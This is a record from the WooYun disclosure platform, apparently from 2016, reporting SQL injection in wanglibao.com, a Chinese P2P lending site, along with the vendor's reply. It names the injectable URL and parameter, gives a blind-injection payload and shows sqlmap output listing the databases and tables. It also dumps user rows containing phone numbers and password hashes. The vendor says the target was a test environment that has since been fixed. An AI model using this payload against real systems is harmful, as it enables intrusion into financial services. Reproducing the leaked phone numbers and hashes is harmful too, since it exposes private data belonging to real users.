{"id": 74137, "wybug_id": "wooyun-2016-0167038", "wybug_title": "P2P金融安全之网利宝SQL注射进一步可操纵用户资金", "wybug_corp": "wanglibao.com", "wybug_author": "带头大哥", "wybug_date": "2016-01-04 16:31", "wybug_open_date": "2016-02-20 15:48", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-20：\t细节向公众公开  简要描述： 金融安全不可忽视，在金融会议上看到网利宝CEO，不知道你们家的漏洞有没有礼物相赠。 详细说明：  #Sql注射\nhttp://source.wanglibao.com/monthly.php?action=detail&project_id=2619\n注射如图(payload)：\n\n\nsqlmap resumed the following injection point(s) from stored session:---Parameter: project_id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: action=detail&project_id=2619' AND 4993=4993 AND 'slIZ'='slIZ---[17:48:46] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.6.14, Nginxback-end DBMS: MySQL 5[17:48:46] [INFO] fetching database names[17:48:46] [INFO] fetching number of databases[17:48:46] [INFO] resumed: 4[17:48:46] [INFO] resumed: information_schema[17:48:46] [INFO] resumed: passport[17:48:47] [INFO] resumed: test[17:48:47] [INFO] resumed: wanglibaoavailable databases [4]:[*] information_schema[*] passport[*] test[*] wanglibao\n#wanglibao数据库库表：\nDatabase: wanglibao[40 tables]+------------------------+| user                   || access                 || admin_actor            || admin_actor_group      || admin_actor_permission || admin_permission       || admin_permission_group || admin_user             || adminuser              || agreement_template     || amortization           || attchment              || bank                   || buy_exchange           || buy_exchange_purchase  || buydetail              || category               || codes                  || comfirm                || company                || contract               || coupon                 || dbcache                || filepool               || id_genter              || loginlog               || node                   || oncontract             || op_log                 || operationlog           || project                || project_addon          || project_agreement      || project_detail         || role                   || sessions               || sqs_content            || sysinfo                || system_log             || user_amortization      |+------------------------+\n   漏洞证明：  #金融安全未深入，跑出USER部分数据，只为点到。\nDatabase: wanglibaoTable: user[6 entries]+----+-------------+-------------------------------------------------------------------------------+| id | name        | password                                                                      |+----+-------------+-------------------------------------------------------------------------------+| 1  | 13910562833 | pbkdf2_sha256$12000$gEdb355E6tSC$pZ4QJxOFuRVWvuippiTFyjS+uWVOlIPWDlhWWYe7kr8= || 2  | 13910562433 | pbkdf2_sha256$12000$lZ7HuO4jqIMS$25o5BMM2Nyg9mdvNnBb9mBWhF45JjAu220Hqti8SgeM= || 3  | 13910563421 | pbkdf2_sha256$12000$j6EF1sEIwhk0$Ntw399lGkswW/+bEledT0ZjT9wM+R9NS2tHy4nn4cdA= || 4  | 13269296780 | pbkdf2_sha256$12000$NP4jJnluNTCH$7HmCLwNCuN2Hj3DwU3J5aNPqseWw5ynqypP86PCLQic= || 5  | 17601645914 | pbkdf2_sha256$12000$76rYfEgZal5B$g3KuEZAeIBuZcCdX2aRsIQt/6lnorxoB0o/sUXOYQys= |\n   修复方案：  我是来找礼物的.   版权声明：转载请注明来源 带头大哥@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：9  确认时间：2016-01-06 23:23 厂商回复： 已安排处理 最新状态： 2016-01-26：此为测试环境，已修复。  ", "replys": "漏洞评价：\n评价\n     2016-01-04 17:20 |    \t\tking7 \t\t\t( 普通白帽子  |\t\t\t        Rank:1619 漏洞数:231        )\t\t \n  我表哥收礼物专业户    \n     2016-01-04 17:21 |    \t\t带头大哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:494 漏洞数:154        | |任意邮件伪造| |目录遍历| |任意文件读取|...)\t\t \n  @king7 擦，暴露目标了。。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 9, "Ranks": null}